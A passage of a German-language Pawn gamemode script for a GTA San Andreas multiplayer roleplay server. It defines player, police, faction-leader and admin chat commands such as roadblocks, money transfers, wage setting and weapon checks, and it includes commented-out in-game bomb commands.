	//-----------------------------GET-IP-------------------------------------------
	if(strcmp(cmd, "/getip", true) == 0)
	{
		if (PlayerInfo[playerid][pAdmin] >= 1337)
		{
			tmp = strtoknew(cmdtext,idx);
			if(!strlen(tmp))
			{
  				SendClientMessage(playerid,COLOR_GRAD1,"FEHLER: /getip [playerid]");
		        return 1;
			}
 			giveplayerid = ReturnUser(tmp);
 			new playersip[16];
			GetPlayerIp(giveplayerid,playersip,sizeof(playersip));
 			format(string,sizeof(string),"IP: %s",playersip);
			SendClientMessage(playerid,COLOR_GRAD2,string);
		}
		return 1;
	}
	//----------------------------- Fraktionshilfe------------------------------------
	if(strcmp(cmd, "/fractionlist", true) == 0 || strcmp(cmd, "/fl", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
				SendClientMessage(playerid, COLOR_GOLD, "Fraktion 1: LSPD || Fraktion 2: FBI || Fraktion 3: Bundeswehr");
				SendClientMessage(playerid, COLOR_GOLD, "Fraktion 4: Los Santos Sanitäter || Fraktion 5: LCN || Fraktion 6: Yakuza");
				SendClientMessage(playerid, COLOR_GOLD, "Fraktion 7: San Andreas Präsident || Fraktion 8: Hitmen || 9: San News");
				SendClientMessage(playerid, COLOR_GOLD, "Fraktion 10: Transport GmbH || Fahrlehrer 11 || Fraktion 12: Triaden");
				SendClientMessage(playerid, COLOR_GOLD, "Fraktion 13: Grove Street || Fraktion 14: Ballas");
				SendClientMessage(playerid, COLOR_GOLD, "Fraktion 16: LS Vagos || Fraktion 17: Aztecas || Fraktion 18: SF Rifa");
				SendClientMessage(playerid, COLOR_GOLD, "Fraktion 19: Red Soldiers || Fraktion 20: Terroristen || Fraktion 21: Wheelmen");
				SendClientMessage(playerid, COLOR_GOLD, "Fraktion 22: S.W.A.T || Fraktion 23: Russen Mafia || Fraktion 24: Ordnungsamt");
			}
		return 1;
	}
    //============
	if(strcmp(cmd,"/dc",true)==0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Checkpoint entfernt!");
		}
		return 1;
	}
	//-------------------------------------Rüstung im Waffenladen kaufen------------
	if(strcmp(cmd,"/buyarmor",true)==0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pLevel] <= 2)
	        {
	            SendClientMessage(playerid, COLOR_RED, "Du musst mindestens Level 3 sein um hier einzukaufen");
	            return 1;
			}
   			if(GetPlayerMoneySave(playerid) < 1000)
			{
			    SendClientMessage(playerid, COLOR_GREY, "*Nicht genug Geld,du brauchst 1000$!");
			    return 1;
			}
		    if(PlayerInfo[playerid][pGunLic] == 0)
			{
				SendClientMessage(playerid, COLOR_GREY, "*Du brauchst einen Waffenschein!");
		  		return 1;
			}
			//new location = PlayerInfo[playerid][pLocal];
			if(IsPlayerInRangeOfPoint(playerid,3.0,290.2523,-106.7863,1001.5156)||IsPlayerInRangeOfPoint(playerid,3.0,295.4237,-38.1667,1001.5156))//location == 101 || location == 102 || location == 103)
			{





		        if(PlayerInfo[playerid][pBizID] == 1)//3 bis 5
 		       {
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 250;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 1000;

					GivePlayerMoneySave(playerid,-1000);
					SetPlayerArmour(playerid, 100);
					SendClientMessage(playerid, COLOR_GREEN, "Schutzweste für 1000$ gekauft.");
				}
				else SendClientMessage(playerid, COLOR_WHITE, "Du bist in keinem Geschäft.");
			}
		}
		return 1;
	}
	if (strcmp( cmdtext,"/sperre", true )==0)
	{
		if(!IsACop(playerid))
		{
			SendClientMessage(playerid, COLOR_YELLOW,"Sie Haben keine Berechtigung");
			return 1;
		}
		if(Sperrebit[playerid]==0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
			{
				new Float:x,Float:y,Float:z,Float:a;
				GetPlayerPos(playerid,x,y,z);
				GetPlayerFacingAngle(playerid,a);
				GetXYInFrontOfPlayer(playerid,x,y,2.0);
				sSperre[playerid][0] = CreateDynamicObject(1228,x,y,z-0.5,0,0,a+90);
				sSperre[playerid][1] = CreateDynamicObject(1228,x+2.0 * floatsin(-a+90, degrees),y+2.0 * floatcos(-a+90, degrees),z-0.5,0,0,a+90);
				sSperre[playerid][2] = CreateDynamicObject(1228,x+4.0 * floatsin(-a+90, degrees),y+4.0 * floatcos(-a+90, degrees),z-0.5,0,0,a+90);
				sSperre[playerid][3] = CreateDynamicObject(1228,x-2.0 * floatsin(-a+90, degrees),y-2.0 * floatcos(-a+90, degrees),z-0.5,0,0,a+90);
				sSperre[playerid][4] = CreateDynamicObject(1228,x-4.0 * floatsin(-a+90, degrees),y-4.0 * floatcos(-a+90, degrees),z-0.5,0,0,a+90);
				Sperrebit[playerid]=4;
				SendClientMessage(playerid, COLOR_YELLOW,"Straßensperre erstellt!");
			}
			else
			{
				SendClientMessage(playerid, COLOR_RED,"Du kannst keine Straßensperre erstellen wenn du in einem Auto bist!");
			}
		}
		else
		{
			DestroyDynamicObject(sSperre[playerid][0]);
			DestroyDynamicObject(sSperre[playerid][1]);
			DestroyDynamicObject(sSperre[playerid][2]);
			DestroyDynamicObject(sSperre[playerid][3]);
			DestroyDynamicObject(sSperre[playerid][4]);
			Sperrebit[playerid]=0;
			SendClientMessage(playerid, COLOR_YELLOW,"Straßensperre abgebaut!");
		}
		return 1;
	}
	if(strcmp(cmdtext, "/sperrewegall", true) == 0)
	{
		if (PlayerInfo[playerid][pRank] >= 2 && PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pAdmin] > 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 2)
		{
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsACop(i) && IsPlayerConnected(i))
				{
					DestroyDynamicObject(sSperre[i][0]);
					DestroyDynamicObject(sSperre[i][1]);
					DestroyDynamicObject(sSperre[i][2]);
					DestroyDynamicObject(sSperre[i][3]);
					DestroyDynamicObject(sSperre[i][4]);
					Sperrebit[playerid]=0;
				}
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "HQ: Durch die Anordnung von Officer %s wurden alle Starßensperren entfernt.", sendername);
				if(IsACop(i) && IsPlayerConnected(i))
				{
					SendClientMessage(i, TEAM_BLUE_COLOR, string);
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Du musst Rang 2 haben oder Polizeichef sein um alle Straßensperren entfernen zu können!");
		}
		return 1;
	}
//=======================/sdpistol [ID]====================//
	if(strcmp(cmd, "/wsp", true) == 0)
	{
		if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /wsp [playerid] (Den Befehl nicht ausnutzen!!!)");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if (PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)
			{
			    if(IsPlayerConnected(giveplayerid))
			    {
			        if(giveplayerid != INVALID_PLAYER_ID)
			        {
						ServerWeapon(giveplayerid, 23, 20);
						SendClientMessage(playerid, COLOR_GREEN, "Die Prüfung kann beginnen, 2000$ Waffengebühr bezahlt.");
						GivePlayerMoneySave(playerid,-2000);
						SendClientMessage(giveplayerid, COLOR_GREEN, "Dir wurde eine Silenced Pistol mit 20 Munition gegeben, viel Glück.");
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "  Du bist kein Fahrlehrer!");
			}
		}
		return 1;
	}
	//-----------------------------------------Grab----------------------------------
	if(strcmp(cmd, "/grab", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
  			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_WHITE, "Benutze: /grab [ID]");
				return 1;
			}
 			if(IsACop(playerid))
			{
				new person = strval(tmp);
				new playerVehicle = GetPlayerVehicleID(playerid);
			    if(IsPlayerConnected(person))
				{
					if(person != INVALID_PLAYER_ID)
					{
					    if(GetDistanceBetweenPlayers(playerid,person) <= 8)
						{
						    if(!IsPlayerInAnyVehicle(playerid))
						    {
						        SendClientMessage(playerid, COLOR_GREY, "   Du kannst nur in Fahrzeugen grabben!");
						        return 1;
						    }
						    if(PlayerCuffed[person] != 1)
						    {
						        SendClientMessage(playerid, COLOR_GREY, "Spieler muss getazert sein!");
						        return 1;
						    }
						    if(IsACop(person))
						    {
						        SendClientMessage(playerid, COLOR_GREY, "Du kannst keinen Cop grabben!");
						        return 1;
						    }
						    if(IsPlayerInAnyVehicle(person))
						    {
						        SendClientMessage(playerid, COLOR_GREY, "Ziel ist in einem Auto!");
						        return 1;
						    }
						    if(person == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dich nicht selbst grabben!"); return 1; }
						    if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2)
						    {
							    new car = GetPlayerVehicleID(playerid);
								if(IsA2Turer(car))
								{
		    						SendClientMessage(playerid, COLOR_GRAD1, "Mit dem Auto kannst du keine Leute grabben!");
						    		return 1;
								}
      							GetPlayerName(person, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
						        format(string, sizeof(string), "* Du wurdest von %s ins Farzeug gezogen.", sendername);
								SendClientMessage(person, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* Du hast %s ins  Fahrzeug gezogen.", giveplayer);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* %s hat %s ins Fahrzeug gezogen", sendername ,giveplayer);
								ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
								GameTextForPlayer(person, "~r~Festgenommen", 2500, 3);
								PutPlayerInVehicle(person,playerVehicle,3);
								KillTimer(hacken[giveplayerid]);
								FreezePlayer(person);
								PlayerCuffed[person] = 2;
								PlayerCuffedTime[person] = 4;
							}
							else
							{
								SendClientMessage(playerid, COLOR_GREY, "Du fährst kein Auto!");
								return 1;
							}
			            }
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "Spieler ist nicht in deine Nähe!");
						    return 1;
						}
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Du bist kein Cop!");
			}
		}
	    return 1;
	}

	if(strcmp(cmd, "/ungrab", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(IsACop(playerid))
			{
			    tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp)) {
					SendClientMessage(playerid, COLOR_WHITE, "Benutze: /ungrab [ID]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
					if(giveplayerid != INVALID_PLAYER_ID)
					{
					    if (ProxDetectorS(8.0, playerid, giveplayerid))
						{
						    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dich nicht selbst freilassen!"); return 1; }
							if(PlayerCuffed[giveplayerid])
							{
							    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
							    format(string, sizeof(string), "* Du wurdest von %s freigelassen.", sendername);
								SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* Du hast %s freigelassen.", giveplayer);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* %s hat %s freigelassen.", sendername ,giveplayer);
								ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
								GameTextForPlayer(giveplayerid, "~g~Freiheit", 2500, 3);
								UnFreezePlayer(giveplayerid);
								PlayerCuffed[giveplayerid] = 0;
        						//RemovePlayerFromVehicle(giveplayerid);
								new Float:X, Float:Y, Float:Z;
								GetPlayerPos(playerid,X,Y,Z);
								SetPlayerPos(playerid,X,Y+1,Z);
							}
							else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Person hat keine Handschellen!");
							    return 1;
							}
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Spieler ist nicht bei dir!");
						    return 1;
						}
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Offline!");
				    return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Cop / Soldat / GSG !");
			}
		}//not connected
		return 1;
	}

	//------------------------------------WARNS-Checken-----------------------------
    if(strcmp(cmd,"/checkwarns",true)==0)
	{
    	new warnstring[128];
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][pAdmin] >= 1)
			{
			    tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /checkwarns [ID]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				new warns = PlayerInfo[giveplayerid][pWarns];
				format(warnstring, sizeof(warnstring), "ACHTUNG! Der Spieler hat %d Warns",warns);
				SendClientMessage(playerid, COLOR_GRAD5,warnstring);
			}
		}
		return 1;
	}
/*
	if(strcmp(cmd, "/defuse", true) == 0)
    {
  		if(IsPlayerInRangeOfPoint(playerid,10.0,PlayerExplosionX[1], PlayerExplosionY[1], PlayerExplosionZ[1]))
  		{
  		    if(IsACop(playerid))
			{
			    if(Bombactivated==1)
			    {
	  				//Bombtimer(10,playerid);
					ShowMenuForPlayer(Menu:BOMBD,playerid);
					return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid,COLOR_GRAD1,"Du bist nicht befugt!");
			}
		}
		else
		{
		    SendClientMessage(playerid,COLOR_GRAD1,"Du bist nicht bei der Bombe!");
		}
	}
	if(strcmp(cmd, "/legbombe", true) == 0 || strcmp(cmd, "/bombelegen", true) == 0)
	{
	    if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
	    {

//	    	if(BombStatus == 1)
//		    {
//		    	SendClientMessage(playerid, COLOR_WHITE, "Es kann nur alle 5 Minuten eine Bombe gelegt werden.");
//			}

			else if(PlayerInfo[playerid][pJailed] > 0)
		    {
		    	SendClientMessage(playerid, COLOR_WHITE, "Du kannst dich nicht im Gefängnis hochjagen.");
			}
			else if(GetPlayerInterior(playerid) > 0)
		    {
		    	SendClientMessage(playerid, COLOR_WHITE, "Das ist ein schlechter Ort für eine Bombe...");
			}
			else
			{
				ShowMenuForPlayer(Menu:BOMB,playerid);
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_WHITE, "*Du bist kein Terrorist.");
		}
		return 1;
	}
*/
	//------------------------------Selbstmord-Attentat-----------------------------

/*
	if(strcmp(cmd, "/selbstmord", true) == 0)
	{
	    if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20 || PlayerInfo[playerid][pRank] == 2)
	    {
	    	if(SelfStatus == 1)
		    {
		    	SendClientMessage(playerid, COLOR_WHITE, "Du kannst dich nur alle 30 Minuten selber Hochjagen.");
			}
			else
   			{
				new Float:x, Float:y, Float:z;
				GetPlayerPos(playerid, x, y, z );
				SetTimer("SAbkling", 120000, 0);
				GameTextForPlayer(playerid, "~r~ B.o.o.o.o.m", 5000, 3);
		    	SendClientMessage(playerid, COLOR_LIGHTRED, ".:Selbstmord ist keine Lösung:.");
				WantedPoints[playerid] += 2;
				SetPlayerCriminal(playerid,255, "Selbstmord");
				GivePlayerMoneySave(playerid,5000);
				SelfStatus = 1;
				if (IsPlayerInAnyVehicle(playerid))
				{
					GetPlayerVehicleID(playerid);
					SetVehicleHealth(playerid,0);
					CreateExplosion(x,y,z,6,2);
					CreateExplosion(x,y,z,7,2);
				}
				else
				{
					SetPlayerHealth(playerid,10);
					CreateExplosion(x,y,z,6,2);
					CreateExplosion(x,y,z,7,2);
				}
	 			for(new i = 0; i < MAX_PLAYERS; i++)
				{
		        	if(IsACop(i))
		        	{
		        	    SendClientMessage(i,COLOR_RED,"BOMBENALARM: Selbstmord Anschlag!");
					}
				}
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_WHITE, "*Du bist kein Terrorist.");
		}
		return 1;
	}
*/

	//---------------------------------/clearchat--------------------------------------------

	if(strcmp(cmd, "/cleartext", true) == 0 || strcmp(cmd, "/ct", true) == 0)
	{
		if (PlayerInfo[playerid][pAdmin] >= 1 )
		{

		    for(new i = 0; i<MAX_PLAYERS; i++)
		    {
		        if(PlayerInfo[i][pAdmin]>0) continue;

		        else
		        {
		            for (new MSG=0; MSG<=80; MSG++) SendClientMessage(i,-1," ");
				}
			}
		//	for (new MSG=0; MSG<=80; MSG++) SendClientMessageToAll(0," ");



			//for (new MSG=0; MSG<=80; MSG++) SendClientMessageToAll(0," ");
			GetPlayerName(playerid,sendername,sizeof(sendername));
			format(string, sizeof(string), "*** Administrator %s hat den Chat gelöscht ***",sendername);
			SendClientMessageToAll(COLOR_LIGHTBLUE,string);
			printf(string);
		}
		else SendClientMessage(playerid,0, "Du bist nicht befugt !");
		return 1;
	}

	//---------------------------------------SERVER Status--------------------------------------------
	if(strcmp("/rechte", cmdtext, true) == 0)
	{
	    SendClientMessage(playerid,COLOR_YELLOW, "==============[RECHTE]===============");
	    SendClientMessage(playerid,COLOR_ORANGE, "Spawndeagle + 2 Respektpunkte pro Payday + /togphone");
	    SendClientMessage(playerid,COLOR_ORANGE, "Möglichkeit 6 Fahrzeuge zu besitzen /carkey");
		SendClientMessage(playerid,COLOR_ORANGE, "Mehr Informationen bei Admins!");
		SendClientMessage(playerid,COLOR_YELLOW, "==================================");
		return 1;
	}
	//-------------------------------[Pay]--------------------------------------------------------------------------
	if(strcmp(cmd, "/pay", true) == 0)
	{
		if(PlayerInfo[playerid][pLevel] < 2)
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Du musst mindestens Level 2 sein, um Geld zu vergeben.");
			return 1;
		}
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD1, "NUTZUNG: /pay [Spieler ID / Name] [Menge]");
				return 1;
			}
			//giveplayerid = strval(tmp);
	        giveplayerid = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD1, "NUTZUNG: /pay [Spieler ID / Name] [Menge]");
				return 1;
			}
			moneys = strval(tmp);
			if(moneys > 1000 && PlayerInfo[playerid][pLevel] < 3)
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du musst mindestens Level 3 sein, um über $1000 abgeben zu können.");
				return 1;
			}
			if(moneys < 1 || moneys > 1000000)
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Der Betrag muss zwischen $1 und $1000000 sein!");
			    return 1;
			}
			if (IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
			        if(PlayerInfo[giveplayerid][pLocal] == 106)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "Der Befehl ist in dieser Lage nicht erlaubt.");
						return 1;
					}
					if (ProxDetectorS(5.0, playerid, giveplayerid))
					{
						GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						playermoney = GetPlayerMoneySave(playerid);
     					if (moneys > 0 && playermoney >= moneys)
						{
                            if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dir nicht selbst Geld geben!"); return 1; }
						    ConsumingMoney[giveplayerid] = 1;
							GivePlayerMoneySave(playerid, (0 - moneys));
							GivePlayerMoneySave(giveplayerid, moneys);
							format(string, sizeof(string), "   Du hast %s(Spieler ID: %d), $%d gegeben.", giveplayer,giveplayerid, moneys);
							PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
							SendClientMessage(playerid, COLOR_GRAD1, string);
							format(string, sizeof(string), "   Du hast $%d von %s(Spieler ID: %d) bekommen.", moneys, sendername, playerid);
							SendClientMessage(giveplayerid, COLOR_GRAD1, string);
							format(string, sizeof(string), "%s hat $%d dem Spieler %s gegeben.", sendername, moneys, giveplayer);
							PayLog(string);
							if(moneys >= 1000000)
							{
								ABroadCast(COLOR_YELLOW,string,1);
							}
							PlayerPlaySound(giveplayerid, 1052, 0.0, 0.0, 0.0);
							format(string, sizeof(string), "* %s nimmt Geld aus seiner Tasche und gibt es %s.", sendername ,giveplayer);
							ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						}
						else
						{
							SendClientMessage(playerid, COLOR_GRAD1, "Ungültiger Betrag.");
						}
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD1, "Du musst näher an dem Spieler sein!");
					}
				}//invalid id
			}
			else
			{
				format(string, sizeof(string), "%d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}

//================ SETLOHN =====================//
    if(strcmp(cmd, "/setlohn", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /setlohn [Spieler ID / Name] [Lohn / Payday]");
				return 1;
			}
			new playa;
			playa = ReturnUser(tmp);
			new gehalt;
			tmp = strtoknew(cmdtext, idx);
			gehalt = strval(tmp);
			if (PlayerInfo[playerid][pLeader] >= 1)
			{
				if(IsPlayerConnected(playa))
				{
					if(PlayerInfo[playerid][pLeader] == PlayerInfo[playa][pMember] || PlayerInfo[playerid][pLeader] == PlayerInfo[playa][pLeader])
					{
					    if(gehalt > 0 && gehalt < 60000)
         				{
							PlayerInfo[playa][pGehalt] = gehalt;
							GetPlayerName(playa, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							format(string, sizeof(string), "*Du hast %s Gehalt geändert in %d$.", giveplayer, gehalt);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "*%s hat dein Gehalt geändert in %d$.", sendername, gehalt);
							SendClientMessage(playa, COLOR_LIGHTBLUE, string);
							return 1;
						}
						else SendClientMessage(playerid, COLOR_RED," Du kannst den Lohn Maximal auf 10000 Doller setzen!");
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Dieser Befehl ist nur für Leader einer Fraktion!");
			}
		}
		return 1;
	}
//-------------------------------[Stats]--------------------------------------------------------------------------
	if (strcmp(cmd, "/stats", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (gPlayerLogged[playerid] != 0)
			{
				Stats(playerid,playerid);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht eingeloggt !");
			}
		}
		return 1;
	}

	if(strcmp(cmd, "/dn", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pAdmin] >= 1)
			{
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz-2);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt !");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/up", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pAdmin] >= 1)
			{
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+2);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt !");
			}
		}
		return 1;
	}
	if (strcmp(cmd, "/fly", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pAdmin] >= 1337)
			{
				new Float:px, Float:py, Float:pz, Float:pa;
				GetPlayerFacingAngle(playerid,pa);
				if(pa >= 0.0 && pa <= 22.5) //n1
				{
					GetPlayerPos(playerid, px, py, pz);
					SetPlayerPos(playerid, px, py+30, pz+5);
				}
				if(pa >= 332.5 && pa < 0.0) //n2
				{
					GetPlayerPos(playerid, px, py, pz);
					SetPlayerPos(playerid, px, py+30, pz+5);
				}
				if(pa >= 22.5 && pa <= 67.5) //nw
				{
					GetPlayerPos(playerid, px, py, pz);
					SetPlayerPos(playerid, px-15, py+15, pz+5);
				}
				if(pa >= 67.5 && pa <= 112.5) //w
				{
					GetPlayerPos(playerid, px, py, pz);
					SetPlayerPos(playerid, px-30, py, pz+5);
				}
				if(pa >= 112.5 && pa <= 157.5) //sw
				{
					GetPlayerPos(playerid, px, py, pz);
					SetPlayerPos(playerid, px-15, py-15, pz+5);
				}
				if(pa >= 157.5 && pa <= 202.5) //s
				{
					GetPlayerPos(playerid, px, py, pz);
					SetPlayerPos(playerid, px, py-30, pz+5);
				}
				if(pa >= 202.5 && pa <= 247.5)//se
				{
					GetPlayerPos(playerid, px, py, pz);
					SetPlayerPos(playerid, px+15, py-15, pz+5);
				}
				if(pa >= 247.5 && pa <= 292.5)//e
				{
					GetPlayerPos(playerid, px, py, pz);
					SetPlayerPos(playerid, px+30, py, pz+5);
				}
				if(pa >= 292.5 && pa <= 332.5)//e
				{
					GetPlayerPos(playerid, px, py, pz);
					SetPlayerPos(playerid, px+15, py+15, pz+5);
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt !");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/lt", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pAdmin] >= 1)
			{
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly+2, slz);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt !");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/rt", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pAdmin] >= 1)
			{
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly-2, slz-2);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt !");
			}
		}
		return 1;
	}
//-------------------------------[Check]--------------------------------------------------------------------------

	if(strcmp(cmd, "/checkwaffen", true) == 0)
	{
	    if(PlayerInfo[playerid][pAdmin] >= 1)
	    {
	        tmp = strtoknew(cmdtext, idx);
	        if(!strlen(tmp))
	        {
	            SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /checkwaffen [Spieler ID]");
	            return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if(giveplayerid != INVALID_PLAYER_ID)
			{
 				new bullets[12], weapons[12], weapname[12][50], coordsstring[256];
				GetPlayerWeaponData(giveplayerid,1,weapons[0],bullets[0]); GetPlayerWeaponData(giveplayerid,2,weapons[1],bullets[1]);
				GetPlayerWeaponData(giveplayerid,3,weapons[2],bullets[2]); GetPlayerWeaponData(giveplayerid,4,weapons[3],bullets[3]);
				GetPlayerWeaponData(giveplayerid,5,weapons[4],bullets[4]); GetPlayerWeaponData(giveplayerid,6,weapons[5],bullets[5]);
				GetPlayerWeaponData(giveplayerid,7,weapons[6],bullets[6]); GetPlayerWeaponData(giveplayerid,8,weapons[7],bullets[7]);
				GetPlayerWeaponData(giveplayerid,9,weapons[8],bullets[8]); GetPlayerWeaponData(giveplayerid,10,weapons[9],bullets[9]);
				GetPlayerWeaponData(giveplayerid,11,weapons[10],bullets[10]); GetPlayerWeaponData(giveplayerid,12,weapons[11],bullets[11]);
				GetWeaponName(weapons[0],weapname[0],50); GetWeaponName(weapons[1],weapname[1],50); GetWeaponName(weapons[2],weapname[2],50);
				GetWeaponName(weapons[3],weapname[3],50); GetWeaponName(weapons[4],weapname[4],50); GetWeaponName(weapons[5],weapname[5],50);
				GetWeaponName(weapons[6],weapname[6],50); GetWeaponName(weapons[7],weapname[7],50); GetWeaponName(weapons[8],weapname[8],50);
				GetWeaponName(weapons[9],weapname[9],50); GetWeaponName(weapons[10],weapname[10],50); GetWeaponName(weapons[11],weapname[11],50);
				format(coordsstring,sizeof(coordsstring),"Waffen: %s[0]   %s[%d]   %s[%d]   %s[%d]   %s[%d]   %s[%d]",weapname[0],weapname[1],bullets[1],weapname[2],bullets[2],weapname[3],bullets[3],weapname[4],bullets[4],weapname[5],bullets[5]);
				SendClientMessage(playerid,COLOR_GRAD6,coordsstring);
				format(coordsstring,sizeof(coordsstring),"Waffen: %s[%d]   %s[%d]   %s[%d]   %s[0]   %s[0]   %s[0]",weapname[6],bullets[6],weapname[7],bullets[7],weapname[8],bullets[8],weapname[9],weapname[10],weapname[11]);
				SendClientMessage(playerid,COLOR_GRAD6,coordsstring);
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Admin 1450!");
		}
		return 1;
	}
	if (strcmp(cmd, "/check", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][pAdmin] >= 3)
			{
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /check [Spieler ID]");
					return 1;
				}
	            giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
						Stats(playerid,giveplayerid);
					}
				}
				else
				{
